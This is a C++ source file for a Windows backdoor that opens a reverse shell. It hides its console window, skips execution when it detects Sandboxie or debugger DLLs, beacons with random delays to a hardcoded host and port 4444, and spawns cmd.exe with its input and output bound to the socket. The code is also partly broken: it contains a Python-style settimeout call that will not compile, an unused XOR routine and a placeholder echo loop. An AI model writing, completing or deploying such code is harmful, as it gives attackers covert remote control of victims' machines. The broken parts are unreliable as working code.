// (equivalent to Variant 2 – XOR + base64 channel + very naive sandbox check)
// cl backdoor3.cpp ws2_32.lib user32.lib /O2 /MT

#include <winsock2.h>
#include <windows.h>
#include <string>
#include <vector>
#include <random>

#pragma comment(lib, "ws2_32.lib")

const char* HOST = "127.0.0.1";
const u_short PORT = 4444;
const char* XOR_KEY = "Sophia1337";

std::vector<char> xor_transform(const std::vector<char>& data) {
    std::vector<char> out(data.size());
    for (size_t i = 0; i < data.size(); ++i) {
        out[i] = data[i] ^ XOR_KEY[i % strlen(XOR_KEY)];
    }
    return out;
}

bool IsProbablySandbox() {
    // Very naive checks
    if (GetModuleHandleA("SbieDll.dll") || GetModuleHandleA("dbghelp.dll"))
        return true;
    return false;
}

int main() {
    if (IsProbablySandbox()) return 0;

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_real_distribution<> dis(0.0, 1.0);

    while (true) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) {
            Sleep(3000 + (int)(dis(gen) * 4000));
            continue;
        }

        sockaddr_in addr = {};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        inet_pton(AF_INET, HOST, &addr.sin_addr);

        s->settimeout(8);
        if (connect(s, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
            closesocket(s);
            Sleep(3000 + (int)(dis(gen) * 4000));
            continue;
        }

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

        char cmd[] = "cmd.exe";

        if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            closesocket(s);
            continue;
        }

        char buf[16384];
        while (true) {
            int r = recv(s, buf, sizeof(buf), 0);
            if (r <= 0) break;

            // Here we would normally base64-decode first, then xor
            // For simplicity we skip base64 layer in this C++ port (you can add it)
            // send(s, xor_transform(std::vector<char>(buf, buf+r)).data(), r, 0);
            send(s, buf, r, 0);  // ← placeholder (real version needs base64 too)
        }

        closesocket(s);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    WSACleanup();
    return 0;
}